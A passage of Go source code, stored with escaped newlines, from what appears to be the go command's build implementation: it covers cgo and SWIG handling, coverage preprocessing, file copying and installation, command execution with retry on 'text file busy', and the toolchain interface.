use to find its context.\n\t\tb.print(\"\\n#\\n# \" + a.p.ImportPath + \"\\n#\\n\\n\")\n\t}\n\n\tif buildV {\n\t\tb.print(a.p.ImportPath + \"\\n\")\n\t}\n\n\t// Make build directory.\n\tobj := a.objdir\n\tif err := b.mkdir(obj); err != nil {\n\t\treturn err\n\t}\n\n\t// make target directory\n\tdir, _ := filepath.Split(a.target)\n\tif dir != \"\" {\n\t\tif err := b.mkdir(dir); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\tvar gofiles, cgofiles, cfiles, sfiles, cxxfiles, objects, cgoObjects, pcCFLAGS, pcLDFLAGS []string\n\n\tgofiles = append(gofiles, a.p.GoFiles...)\n\tcgofiles = append(cgofiles, a.p.CgoFiles...)\n\tcfiles = append(cfiles, a.p.CFiles...)\n\tsfiles = append(sfiles, a.p.SFiles...)\n\tcxxfiles = append(cxxfiles, a.p.CXXFiles...)\n\n\tif a.p.usesCgo() || a.p.usesSwig() {\n\t\tif pcCFLAGS, pcLDFLAGS, err = b.getPkgConfigFlags(a.p); err != nil {\n\t\t\treturn\n\t\t}\n\t}\n\n\t// Run SWIG on each .swig and .swigcxx file.\n\t// Each run will generate two files, a .go file and a .c or .cxx file.\n\t// The .go file will use import \"C\" and is to be processed by cgo.\n\tif a.p.usesSwig() {\n\t\toutGo, outC, outCXX, err := b.swig(a.p, obj, pcCFLAGS)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tcgofiles = append(cgofiles, outGo...)\n\t\tcfiles = append(cfiles, outC...)\n\t\tcxxfiles = append(cxxfiles, outCXX...)\n\t}\n\n\t// Run cgo.\n\tif a.p.usesCgo() || a.p.usesSwig() {\n\t\t// In a package using cgo, cgo compiles the C, C++ and assembly files with gcc.\n\t\t// There is one exception: runtime/cgo's job is to bridge the\n\t\t// cgo and non-cgo worlds, so it necessarily has files in both.\n\t\t// In that case gcc only gets the gcc_* files.\n\t\tvar gccfiles []string\n\t\tif a.p.Standard && a.p.ImportPath == \"runtime/cgo\" {\n\t\t\tfilter := func(files, nongcc, gcc []string) ([]string, []string) {\n\t\t\t\tfor _, f := range files {\n\t\t\t\t\tif strings.HasPrefix(f, \"gcc_\") {\n\t\t\t\t\t\tgcc = append(gcc, f)\n\t\t\t\t\t} else {\n\t\t\t\t\t\tnongcc = append(nongcc, f)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn nongcc, gcc\n\t\t\t}\n\t\t\tcfiles, gccfiles = filter(cfiles, cfiles[:0], gccfiles)\n\t\t\tsfiles, gccfiles = filter(sfiles, sfiles[:0], gccfiles)\n\t\t} else {\n\t\t\tgccfiles = append(cfiles, sfiles...)\n\t\t\tcfiles = nil\n\t\t\tsfiles = nil\n\t\t}\n\n\t\tcgoExe := tool(\"cgo\")\n\t\tif a.cgo != nil && a.cgo.target != \"\" {\n\t\t\tcgoExe = a.cgo.target\n\t\t}\n\t\toutGo, outObj, err := b.cgo(a.p, cgoExe, obj, pcCFLAGS, pcLDFLAGS, cgofiles, gccfiles, cxxfiles, a.p.MFiles)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tcgoObjects = append(cgoObjects, outObj...)\n\t\tgofiles = append(gofiles, outGo...)\n\t}\n\n\tif len(gofiles) == 0 {\n\t\treturn &build.NoGoError{Dir: a.p.Dir}\n\t}\n\n\t// If we're doing coverage, preprocess the .go files and put them in the work directory\n\t//fmt.Println(\"printing a.p struct\")\n\t//fmt.Printf(\"%%+v\\n\", a.p)\n\tif a.p.coverMode != \"\" {\n\t\tfor i, file := range gofiles {\n\t\t\tvar sourceFile string\n\t\t\tvar coverFile string\n\t\t\tvar key string\n\t\t\tif strings.HasSuffix(file, \".cgo1.go\") {\n\t\t\t\t// cgo files have absolute paths\n\t\t\t\tbase := filepath.Base(file)\n\t\t\t\tsourceFile = file\n\t\t\t\tcoverFile = filepath.Join(obj, base)\n\t\t\t\tkey = strings.TrimSuffix(base, \".cgo1.go\") + \".go\"\n\t\t\t} else {\n\t\t\t\tsourceFile = filepath.Join(a.p.Dir, file)\n\t\t\t\tcoverFile = filepath.Join(obj, file)\n\t\t\t\tkey = file\n\t\t\t}\n\t\t\tcover := a.p.coverVars[key]\n\t\t\tif cover == nil || isTestFile(file) {\n\t\t\t\t// Not covering this file.\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tif err := b.cover(a, coverFile, sourceFile, 0666, cover.Var); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\tgofiles[i] = coverFile\n\t\t}\n\t}\n\n\t// Prepare Go import path list.\n\tinc := b.includeArgs(\"-I\", allArchiveActions(a))\n\n\t// Compile Go.\n\tofile, out, err := buildToolchain.gc(b, a.p, a.objpkg, obj, len(sfiles) > 0, inc, gofiles)\n\tif len(out) > 0 {\n\t\tb.showOutput(a.p.Dir, a.p.ImportPath, b.processOutput(out))\n\t\tif err != nil {\n\t\t\treturn errPrintedOutput\n\t\t}\n\t}\n\tif err != nil {\n\t\treturn err\n\t}\n\tif ofile != a.objpkg {\n\t\tobjects = append(objects, ofile)\n\t}\n\n\t// Copy .h files named for goos or goarch or goos_goarch\n\t// to names using GOOS and GOARCH.\n\t// For example, defs_linux_amd64.h becomes defs_GOOS_GOARCH.h.\n\t_goos_goarch := \"_\" + goos + \"_\" + goarch\n\t_goos := \"_\" + goos\n\t_goarch := \"_\" + goarch\n\tfor _, file := range a.p.HFiles {\n\t\tname, ext := fileExtSplit(file)\n\t\tswitch {\n\t\tcase strings.HasSuffix(name, _goos_goarch):\n\t\t\ttarg := file[:len(name)-len(_goos_goarch)] + \"_GOOS_GOARCH.\" + ext\n\t\t\tif err := b.copyFile(a, obj+targ, filepath.Join(a.p.Dir, file), 0644, true); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\tcase strings.HasSuffix(name, _goarch):\n\t\t\ttarg := file[:len(name)-len(_goarch)] + \"_GOARCH.\" + ext\n\t\t\tif err := b.copyFile(a, obj+targ, filepath.Join(a.p.Dir, file), 0644, true); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\tcase strings.HasSuffix(name, _goos):\n\t\t\ttarg := file[:len(name)-len(_goos)] + \"_GOOS.\" + ext\n\t\t\tif err := b.copyFile(a, obj+targ, filepath.Join(a.p.Dir, file), 0644, true); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t}\n\n\tfor _, file := range cfiles {\n\t\tout := file[:len(file)-len(\".c\")] + \".o\"\n\t\tif err := buildToolchain.cc(b, a.p, obj, obj+out, file); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tobjects = append(objects, out)\n\t}\n\n\t// Assemble .s files.\n\tfor _, file := range sfiles {\n\t\tout := file[:len(file)-len(\".s\")] + \".o\"\n\t\tif err := buildToolchain.asm(b, a.p, obj, obj+out, file); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tobjects = append(objects, out)\n\t}\n\n\t// NOTE(rsc): On Windows, it is critically important that the\n\t// gcc-compiled objects (cgoObjects) be listed after the ordinary\n\t// objects in the archive.  I do not know why this is.\n\t// https://golang.org/issue/2601\n\tobjects = append(objects, cgoObjects...)\n\n\t// Add system object files.\n\tfor _, syso := range a.p.SysoFiles {\n\t\tobjects = append(objects, filepath.Join(a.p.Dir, syso))\n\t}\n\n\t// Pack into archive in obj directory.\n\t// If the Go compiler wrote an archive, we only need to add the\n\t// object files for non-Go sources to the archive.\n\t// If the Go compiler wrote an archive and the package is entirely\n\t// Go sources, there is no pack to execute at all.\n\tif len(objects) > 0 {\n\t\tif err := buildToolchain.pack(b, a.p, obj, a.objpkg, objects); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\t// Link if needed.\n\tif a.link {\n\t\t// The compiler only cares about direct imports, but the\n\t\t// linker needs the whole dependency tree.\n\t\tall := actionList(a)\n\t\tall = all[:len(all)-1] // drop a\n\t\tif err := buildToolchain.ld(b, a, a.target, all, a.objpkg, objects); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\treturn nil\n}\n\n// Calls pkg-config if needed and returns the cflags/ldflags needed to build the package.\nfunc (b *builder) getPkgConfigFlags(p *Package) (cflags, ldflags []string, err error) {\n\tif pkgs := p.CgoPkgConfig; len(pkgs) > 0 {\n\t\tvar out []byte\n\t\tout, err = b.runOut(p.Dir, p.ImportPath, nil, \"pkg-config\", \"--cflags\", pkgs)\n\t\tif err != nil {\n\t\t\tb.showOutput(p.Dir, \"pkg-config --cflags \"+strings.Join(pkgs, \" \"), string(out))\n\t\t\tb.print(err.Error() + \"\\n\")\n\t\t\terr = errPrintedOutput\n\t\t\treturn\n\t\t}\n\t\tif len(out) > 0 {\n\t\t\tcflags = strings.Fields(string(out))\n\t\t}\n\t\tout, err = b.runOut(p.Dir, p.ImportPath, nil, \"pkg-config\", \"--libs\", pkgs)\n\t\tif err != nil {\n\t\t\tb.showOutput(p.Dir, \"pkg-config --libs \"+strings.Join(pkgs, \" \"), string(out))\n\t\t\tb.print(err.Error() + \"\\n\")\n\t\t\terr = errPrintedOutput\n\t\t\treturn\n\t\t}\n\t\tif len(out) > 0 {\n\t\t\tldflags = strings.Fields(string(out))\n\t\t}\n\t}\n\treturn\n}\n\nfunc (b *builder) installShlibname(a *action) error {\n\ta1 := a.deps[0]\n\terr := ioutil.WriteFile(a.target, []byte(filepath.Base(a1.target)+\"\\n\"), 0644)\n\tif err != nil {\n\t\treturn err\n\t}\n\tif buildX {\n\t\tb.showcmd(\"\", \"echo '%%s' > %%s # internal\", filepath.Base(a1.target), a.target)\n\t}\n\treturn nil\n}\n\nfunc (b *builder) linkShared(a *action) (err error) {\n\tallactions := actionList(a)\n\tallactions = allactions[:len(allactions)-1]\n\treturn buildToolchain.ldShared(b, a.deps, a.target, allactions)\n}\n\n// install is the action for installing a single package or executable.\nfunc (b *builder) install(a *action) (err error) {\n\tdefer func() {\n\t\tif err != nil && err != errPrintedOutput {\n\t\t\terr = fmt.Errorf(\"go install %%s: %%v\", a.p.ImportPath, err)\n\t\t}\n\t}()\n\ta1 := a.deps[0]\n\tperm := os.FileMode(0644)\n\tif a1.link {\n\t\tswitch buildBuildmode {\n\t\tcase \"c-archive\", \"c-shared\":\n\t\tdefault:\n\t\t\tperm = 0755\n\t\t}\n\t}\n\n\t// make target directory\n\tdir, _ := filepath.Split(a.target)\n\tif dir != \"\" {\n\t\tif err := b.mkdir(dir); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\t// remove object dir to keep the amount of\n\t// garbage down in a large build.  On an operating system\n\t// with aggressive buffering, cleaning incrementally like\n\t// this keeps the intermediate objects from hitting the disk.\n\tif !buildWork {\n\t\tdefer os.RemoveAll(a1.objdir)\n\t\tdefer os.Remove(a1.target)\n\t}\n\n\treturn b.moveOrCopyFile(a, a.target, a1.target, perm, false)\n}\n\n// includeArgs returns the -I or -L directory list for access\n// to the results of the list of actions.\nfunc (b *builder) includeArgs(flag string, all []*action) []string {\n\tinc := []string{}\n\tincMap := map[string]bool{\n\t\tb.work:    true, // handled later\n\t\tgorootPkg: true,\n\t\t\"\":        true, // ignore empty strings\n\t}\n\n\t// Look in the temporary space for results of test-specific actions.\n\t// This is the $WORK/my/package/_test directory for the\n\t// package being built, so there are few of these.\n\tfor _, a1 := range all {\n\t\tif a1.p == nil {\n\t\t\tcontinue\n\t\t}\n\t\tif dir := a1.pkgdir; dir != a1.p.build.PkgRoot && !incMap[dir] {\n\t\t\tincMap[dir] = true\n\t\t\tinc = append(inc, flag, dir)\n\t\t}\n\t}\n\n\t// Also look in $WORK for any non-test packages that have\n\t// been built but not installed.\n\tinc = append(inc, flag, b.work)\n\n\t// Finally, look in the installed package directories for each action.\n\tfor _, a1 := range all {\n\t\tif a1.p == nil {\n\t\t\tcontinue\n\t\t}\n\t\tif dir := a1.pkgdir; dir == a1.p.build.PkgRoot && !incMap[dir] {\n\t\t\tincMap[dir] = true\n\t\t\tinc = append(inc, flag, a1.p.build.PkgTargetRoot)\n\t\t}\n\t}\n\n\treturn inc\n}\n\n// moveOrCopyFile is like 'mv src dst' or 'cp src dst'.\nfunc (b *builder) moveOrCopyFile(a *action, dst, src string, perm os.FileMode, force bool) error {\n\tif buildN {\n\t\tb.showcmd(\"\", \"mv %%s %%s\", src, dst)\n\t\treturn nil\n\t}\n\n\t// If we can update the mode and rename to the dst, do it.\n\t// Otherwise fall back to standard copy.\n\tif err := os.Chmod(src, perm); err == nil {\n\t\tif err := os.Rename(src, dst); err == nil {\n\t\t\tif buildX {\n\t\t\t\tb.showcmd(\"\", \"mv %%s %%s\", src, dst)\n\t\t\t}\n\t\t\treturn nil\n\t\t}\n\t}\n\n\treturn b.copyFile(a, dst, src, perm, force)\n}\n\n// copyFile is like 'cp src dst'.\nfunc (b *builder) copyFile(a *action, dst, src string, perm os.FileMode, force bool) error {\n\tif buildN || buildX {\n\t\tb.showcmd(\"\", \"cp %%s %%s\", src, dst)\n\t\tif buildN {\n\t\t\treturn nil\n\t\t}\n\t}\n\n\tsf, err := os.Open(src)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer sf.Close()\n\n\t// Be careful about removing/overwriting dst.\n\t// Do not remove/overwrite if dst exists and is a directory\n\t// or a non-object file.\n\tif fi, err := os.Stat(dst); err == nil {\n\t\tif fi.IsDir() {\n\t\t\treturn fmt.Errorf(\"build output %%q already exists and is a directory\", dst)\n\t\t}\n\t\tif !force && fi.Mode().IsRegular() && !isObject(dst) {\n\t\t\treturn fmt.Errorf(\"build output %%q already exists and is not an object file\", dst)\n\t\t}\n\t}\n\n\t// On Windows, remove lingering ~ file from last attempt.\n\tif toolIsWindows {\n\t\tif _, err := os.Stat(dst + \"~\"); err == nil {\n\t\t\tos.Remove(dst + \"~\")\n\t\t}\n\t}\n\n\tmayberemovefile(dst)\n\tdf, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, perm)\n\tif err != nil && toolIsWindows {\n\t\t// Windows does not allow deletion of a binary file\n\t\t// while it is executing.  Try to move it out of the way.\n\t\t// If the move fails, which is likely, we'll try again the\n\t\t// next time we do an install of this binary.\n\t\tif err := os.Rename(dst, dst+\"~\"); err == nil {\n\t\t\tos.Remove(dst + \"~\")\n\t\t}\n\t\tdf, err = os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, perm)\n\t}\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t_, err = io.Copy(df, sf)\n\tdf.Close()\n\tif err != nil {\n\t\tmayberemovefile(dst)\n\t\treturn fmt.Errorf(\"copying %%s to %%s: %%v\", src, dst, err)\n\t}\n\treturn nil\n}\n\n// Install the cgo export header file, if there is one.\nfunc (b *builder) installHeader(a *action) error {\n\tsrc := a.objdir + \"_cgo_install.h\"\n\tif _, err := os.Stat(src); os.IsNotExist(err) {\n\t\t// If the file does not exist, there are no exported\n\t\t// functions, and we do not install anything.\n\t\treturn nil\n\t}\n\n\tdir, _ := filepath.Split(a.target)\n\tif dir != \"\" {\n\t\tif err := b.mkdir(dir); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\treturn b.moveOrCopyFile(a, a.target, src, 0644, true)\n}\n\n// cover runs, in effect,\n//\tgo tool cover -mode=b.coverMode -var=\"varName\" -o dst.go src.go\nfunc (b *builder) cover(a *action, dst, src string, perm os.FileMode, varName string) error {\n\treturn b.run(a.objdir, \"cover \"+a.p.ImportPath, nil,\n\t\tbuildToolExec,\n\t\ttool(\"cover\"),\n\t\t\"-mode\", a.p.coverMode,\n\t\t\"-var\", varName,\n\t\t\"-o\", dst,\n\t\tsrc)\n}\n\nvar objectMagic = [][]byte{\n\t{'!', '<', 'a', 'r', 'c', 'h', '>', '\\n'}, // Package archive\n\t{'\\x7F', 'E', 'L', 'F'},                   // ELF\n\t{0xFE, 0xED, 0xFA, 0xCE},                  // Mach-O big-endian 32-bit\n\t{0xFE, 0xED, 0xFA, 0xCF},                  // Mach-O big-endian 64-bit\n\t{0xCE, 0xFA, 0xED, 0xFE},                  // Mach-O little-endian 32-bit\n\t{0xCF, 0xFA, 0xED, 0xFE},                  // Mach-O little-endian 64-bit\n\t{0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00},      // PE (Windows) as generated by 6l/8l and gcc\n\t{0x00, 0x00, 0x01, 0xEB},                  // Plan 9 i386\n\t{0x00, 0x00, 0x8a, 0x97},                  // Plan 9 amd64\n}\n\nfunc isObject(s string) bool {\n\tf, err := os.Open(s)\n\tif err != nil {\n\t\treturn false\n\t}\n\tdefer f.Close()\n\tbuf := make([]byte, 64)\n\tio.ReadFull(f, buf)\n\tfor _, magic := range objectMagic {\n\t\tif bytes.HasPrefix(buf, magic) {\n\t\t\treturn true\n\t\t}\n\t}\n\treturn false\n}\n\n// mayberemovefile removes a file only if it is a regular file\n// When running as a user with sufficient privileges, we may delete\n// even device files, for example, which is not intended.\nfunc mayberemovefile(s string) {\n\tif fi, err := os.Lstat(s); err == nil && !fi.Mode().IsRegular() {\n\t\treturn\n\t}\n\tos.Remove(s)\n}\n\n// fmtcmd formats a command in the manner of fmt.Sprintf but also:\n//\n//\tIf dir is non-empty and the script is not in dir right now,\n//\tfmtcmd inserts \"cd dir\\n\" before the command.\n//\n//\tfmtcmd replaces the value of b.work with $WORK.\n//\tfmtcmd replaces the value of goroot with $GOROOT.\n//\tfmtcmd replaces the value of b.gobin with $GOBIN.\n//\n//\tfmtcmd replaces the name of the current directory with dot (.)\n//\tbut only when it is at the beginning of a space-separated token.\n//\nfunc (b *builder) fmtcmd(dir string, format string, args ...interface{}) string {\n\tcmd := fmt.Sprintf(format, args...)\n\tif dir != \"\" && dir != \"/\" {\n\t\tcmd = strings.Replace(\" \"+cmd, \" \"+dir, \" .\", -1)[1:]\n\t\tif b.scriptDir != dir {\n\t\t\tb.scriptDir = dir\n\t\t\tcmd = \"cd \" + dir + \"\\n\" + cmd\n\t\t}\n\t}\n\tif b.work != \"\" {\n\t\tcmd = strings.Replace(cmd, b.work, \"$WORK\", -1)\n\t}\n\treturn cmd\n}\n\n// showcmd prints the given command to standard output\n// for the implementation of -n or -x.\nfunc (b *builder) showcmd(dir string, format string, args ...interface{}) {\n\tb.output.Lock()\n\tdefer b.output.Unlock()\n\tb.print(b.fmtcmd(dir, format, args...) + \"\\n\")\n}\n\n// showOutput prints \"# desc\" followed by the given output.\n// The output is expected to contain references to 'dir', usually\n// the source directory for the package that has failed to build.\n// showOutput rewrites mentions of dir with a relative path to dir\n// when the relative path is shorter.  This is usually more pleasant.\n// For example, if fmt doesn't compile and we are in src/html,\n// the output is\n//\n//\t$ go build\n//\t# fmt\n//\t../fmt/print.go:1090: undefined: asdf\n//\t$\n//\n// instead of\n//\n//\t$ go build\n//\t# fmt\n//\t/usr/gopher/go/src/fmt/print.go:1090: undefined: asdf\n//\t$\n//\n// showOutput also replaces references to the work directory with $WORK.\n//\nfunc (b *builder) showOutput(dir, desc, out string) {\n\tprefix := \"# \" + desc\n\tsuffix := \"\\n\" + out\n\tif reldir := shortPath(dir); reldir != dir {\n\t\tsuffix = strings.Replace(suffix, \" \"+dir, \" \"+reldir, -1)\n\t\tsuffix = strings.Replace(suffix, \"\\n\"+dir, \"\\n\"+reldir, -1)\n\t}\n\tsuffix = strings.Replace(suffix, \" \"+b.work, \" $WORK\", -1)\n\n\tb.output.Lock()\n\tdefer b.output.Unlock()\n\tb.print(prefix, suffix)\n}\n\n// shortPath returns an absolute or relative name for path, whatever is shorter.\nfunc shortPath(path string) string {\n\tif rel, err := filepath.Rel(cwd, path); err == nil && len(rel) < len(path) {\n\t\treturn rel\n\t}\n\treturn path\n}\n\n// relPaths returns a copy of paths with absolute paths\n// made relative to the current directory if they would be shorter.\nfunc relPaths(paths []string) []string {\n\tvar out []string\n\tpwd, _ := os.Getwd()\n\tfor _, p := range paths {\n\t\trel, err := filepath.Rel(pwd, p)\n\t\tif err == nil && len(rel) < len(p) {\n\t\t\tp = rel\n\t\t}\n\t\tout = append(out, p)\n\t}\n\treturn out\n}\n\n// errPrintedOutput is a special error indicating that a command failed\n// but that it generated output as well, and that output has already\n// been printed, so there's no point showing 'exit status 1' or whatever\n// the wait status was.  The main executor, builder.do, knows not to\n// print this error.\nvar errPrintedOutput = errors.New(\"already printed output - no need to show error\")\n\nvar cgoLine = regexp.MustCompile(`\\[[^\\[\\]]+\\.cgo1\\.go:[0-9]+\\]`)\nvar cgoTypeSigRe = regexp.MustCompile(`\\b_Ctype_\\B`)\n\n// run runs the command given by cmdline in the directory dir.\n// If the command fails, run prints information about the failure\n// and returns a non-nil error.\nfunc (b *builder) run(dir string, desc string, env []string, cmdargs ...interface{}) error {\n\tout, err := b.runOut(dir, desc, env, cmdargs...)\n\tif len(out) > 0 {\n\t\tif desc == \"\" {\n\t\t\tdesc = b.fmtcmd(dir, \"%%s\", strings.Join(stringList(cmdargs...), \" \"))\n\t\t}\n\t\tb.showOutput(dir, desc, b.processOutput(out))\n\t\tif err != nil {\n\t\t\terr = errPrintedOutput\n\t\t}\n\t}\n\treturn err\n}\n\n// processOutput prepares the output of runOut to be output to the console.\nfunc (b *builder) processOutput(out []byte) string {\n\tif out[len(out)-1] != '\\n' {\n\t\tout = append(out, '\\n')\n\t}\n\tmessages := string(out)\n\t// Fix up output referring to cgo-generated code to be more readable.\n\t// Replace x.go:19[/tmp/.../x.cgo1.go:18] with x.go:19.\n\t// Replace *[100]_Ctype_foo with *[100]C.foo.\n\t// If we're using -x, assume we're debugging and want the full dump, so disable the rewrite.\n\tif !buildX && cgoLine.MatchString(messages) {\n\t\tmessages = cgoLine.ReplaceAllString(messages, \"\")\n\t\tmessages = cgoTypeSigRe.ReplaceAllString(messages, \"C.\")\n\t}\n\treturn messages\n}\n\n// runOut runs the command given by cmdline in the directory dir.\n// It returns the command output and any errors that occurred.\nfunc (b *builder) runOut(dir string, desc string, env []string, cmdargs ...interface{}) ([]byte, error) {\n\tcmdline := stringList(cmdargs...)\n\tif buildN || buildX {\n\t\tvar envcmdline string\n\t\tfor i := range env {\n\t\t\tenvcmdline += env[i]\n\t\t\tenvcmdline += \" \"\n\t\t}\n\t\tenvcmdline += joinUnambiguously(cmdline)\n\t\tb.showcmd(dir, \"%%s\", envcmdline)\n\t\tif buildN {\n\t\t\treturn nil, nil\n\t\t}\n\t}\n\n\tnbusy := 0\n\tfor {\n\t\tvar buf bytes.Buffer\n\t\tcmd := exec.Command(cmdline[0], cmdline[1:]...)\n\t\tcmd.Stdout = &buf\n\t\tcmd.Stderr = &buf\n\t\tcmd.Dir = dir\n\t\tcmd.Env = mergeEnvLists(env, envForDir(cmd.Dir, os.Environ()))\n\t\terr := cmd.Run()\n\n\t\t// cmd.Run will fail on Unix if some other process has the binary\n\t\t// we want to run open for writing.  This can happen here because\n\t\t// we build and install the cgo command and then run it.\n\t\t// If another command was kicked off while we were writing the\n\t\t// cgo binary, the child process for that command may be holding\n\t\t// a reference to the fd, keeping us from running exec.\n\t\t//\n\t\t// But, you might reasonably wonder, how can this happen?\n\t\t// The cgo fd, like all our fds, is close-on-exec, so that we need\n\t\t// not worry about other processes inheriting the fd accidentally.\n\t\t// The answer is that running a command is fork and exec.\n\t\t// A child forked while the cgo fd is open inherits that fd.\n\t\t// Until the child has called exec, it holds the fd open and the\n\t\t// kernel will not let us run cgo.  Even if the child were to close\n\t\t// the fd explicitly, it would still be open from the time of the fork\n\t\t// until the time of the explicit close, and the race would remain.\n\t\t//\n\t\t// On Unix systems, this results in ETXTBSY, which formats\n\t\t// as \"text file busy\".  Rather than hard-code specific error cases,\n\t\t// we just look for that string.  If this happens, sleep a little\n\t\t// and try again.  We let this happen three times, with increasing\n\t\t// sleep lengths: 100+200+400 ms = 0.7 seconds.\n\t\t//\n\t\t// An alternate solution might be to split the cmd.Run into\n\t\t// separate cmd.Start and cmd.Wait, and then use an RWLock\n\t\t// to make sure that copyFile only executes when no cmd.Start\n\t\t// call is in progress.  However, cmd.Start (really syscall.forkExec)\n\t\t// only guarantees that when it returns, the exec is committed to\n\t\t// happen and succeed.  It uses a close-on-exec file descriptor\n\t\t// itself to determine this, so we know that when cmd.Start returns,\n\t\t// at least one close-on-exec file descriptor has been closed.\n\t\t// However, we cannot be sure that all of them have been closed,\n\t\t// so the program might still encounter ETXTBSY even with such\n\t\t// an RWLock.  The race window would be smaller, perhaps, but not\n\t\t// guaranteed to be gone.\n\t\t//\n\t\t// Sleeping when we observe the race seems to be the most reliable\n\t\t// option we have.\n\t\t//\n\t\t// https://golang.org/issue/3001\n\t\t//\n\t\tif err != nil && nbusy < 3 && strings.Contains(err.Error(), \"text file busy\") {\n\t\t\ttime.Sleep(100 * time.Millisecond << uint(nbusy))\n\t\t\tnbusy++\n\t\t\tcontinue\n\t\t}\n\n\t\t// err can be something like 'exit status 1'.\n\t\t// Add information about what program was running.\n\t\t// Note that if buf.Bytes() is non-empty, the caller usually\n\t\t// shows buf.Bytes() and does not print err at all, so the\n\t\t// prefix here does not make most output any more verbose.\n\t\tif err != nil {\n\t\t\terr = errors.New(cmdline[0] + \": \" + err.Error())\n\t\t}\n\t\treturn buf.Bytes(), err\n\t}\n}\n\n// joinUnambiguously prints the slice, quoting where necessary to make the\n// output unambiguous.\n// TODO: See issue 5279. The printing of commands needs a complete redo.\nfunc joinUnambiguously(a []string) string {\n\tvar buf bytes.Buffer\n\tfor i, s := range a {\n\t\tif i > 0 {\n\t\t\tbuf.WriteByte(' ')\n\t\t}\n\t\tq := strconv.Quote(s)\n\t\tif s == \"\" || strings.Contains(s, \" \") || len(q) > len(s)+2 {\n\t\t\tbuf.WriteString(q)\n\t\t} else {\n\t\t\tbuf.WriteString(s)\n\t\t}\n\t}\n\treturn buf.String()\n}\n\n// mkdir makes the named directory.\nfunc (b *builder) mkdir(dir string) error {\n\tb.exec.Lock()\n\tdefer b.exec.Unlock()\n\t// We can be a little aggressive about being\n\t// sure directories exist.  Skip repeated calls.\n\tif b.mkdirCache[dir] {\n\t\treturn nil\n\t}\n\tb.mkdirCache[dir] = true\n\n\tif buildN || buildX {\n\t\tb.showcmd(\"\", \"mkdir -p %%s\", dir)\n\t\tif buildN {\n\t\t\treturn nil\n\t\t}\n\t}\n\n\tif err := os.MkdirAll(dir, 0777); err != nil {\n\t\treturn err\n\t}\n\treturn nil\n}\n\n// mkAbs returns an absolute path corresponding to\n// evaluating f in the directory dir.\n// We always pass absolute paths of source files so that\n// the error messages will include the full path to a file\n// in need of attention.\nfunc mkAbs(dir, f string) string {\n\t// Leave absolute paths alone.\n\t// Also, during -n mode we use the pseudo-directory $WORK\n\t// instead of creating an actual work directory that won't be used.\n\t// Leave paths beginning with $WORK alone too.\n\tif filepath.IsAbs(f) || strings.HasPrefix(f, \"$WORK\") {\n\t\treturn f\n\t}\n\treturn filepath.Join(dir, f)\n}\n\ntype toolchain interface {\n\t// gc runs the compiler in a specific directory on a set of files\n\t// and returns the name of the generated output file.\n\t// The compiler runs in the directory dir.\n\tgc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, out []byte, err error)\n\t// cc runs the toolchain's C compiler in a directory on a C file\n\t// to produce an output file.\n\tcc(b *builder, p *Package, objdir, ofile, cfile string) error\n\t// asm runs the assembler in a specific directory on a specific file\n\t// to generate the named output file.\n\tasm(b *builder, p *Package, obj, ofile, sfile string) error\n\t// pkgpath builds an appropriate path for a temporary package file.\n\tpkgpath(basedir string, p *Package) string\n\t// pack runs the archive packer in a specific directory to create\n\t// an archive from a set of object files.\n\t// typically it is run in the object directory.\n\tpack(b *builder, p *Package, objDir, afile string, ofiles []string) error\n\t// ld runs the linker to create an executable starting at mainpkg.\n\tld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error\n\t// ldShared runs the linker to create a shared library containing the pkgs built by toplevelactions\n\tldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error\n\n\tcompiler() string\n\tlinker() string\n}\n\ntype noToolchain struct{}\n\nfunc noCompiler() error {\n\tlog.Fatalf(\"unknown compiler %%q\", buildContext.Compiler)\n\treturn nil\n}\n\nfunc (noToolchain) compiler() string {\n\tnoCompiler()\n\treturn \"\"\n}\n\nfunc (noToolchain) linker() string {\n\tnoCompiler()\n\treturn \"\"\n}\n\nfunc (noToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, out []byte, err error) {\n\treturn \"\", nil, noCompiler()\n}\n\nfunc (noToolchain) asm(b *builder, p *Package, obj, ofile, sfile string) error {\n\treturn noCompiler()\n}\n\nfunc (noToolchain) pkgpath(basedir string, p *Package) string {\n\tnoCompiler()\n\treturn \"\"\n}\n\nfunc (noToolchain) pack(b *builder, p *Package, objDir, afile string, ofiles []string) error {\n\treturn noCompiler()\n}\n\nfunc (noToolchain) ld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error {\n\treturn noCompiler()\n}\n\nfunc (noToolchain) ldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error {\n\treturn noCompiler()\n}\n\nfunc (noToolchain) cc(b *builder, p *Package, objdir, ofile, cfile string) error {\n\treturn noCompiler()\n}\n\n// The Go toolchain.\ntype gcToolchain struct{}\n\nfunc (gcToolchain) compiler() string {\n\treturn tool(\"compile\")\n}\n\nfunc (gcToolchain) linker() string {\n\treturn tool(\"link\")\n}\n\nfunc (gcToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, output []byte, err error) {\n\tif archive != \"\" {\n\t\tofile = archive\n\t} else {\n\t\tout := \"_go_.o\"\n\t\tofile = obj + out\n\t}\n\n\tgcargs := []string{\"-p\", p.ImportPath}\n\tif p.Name == \"main\" 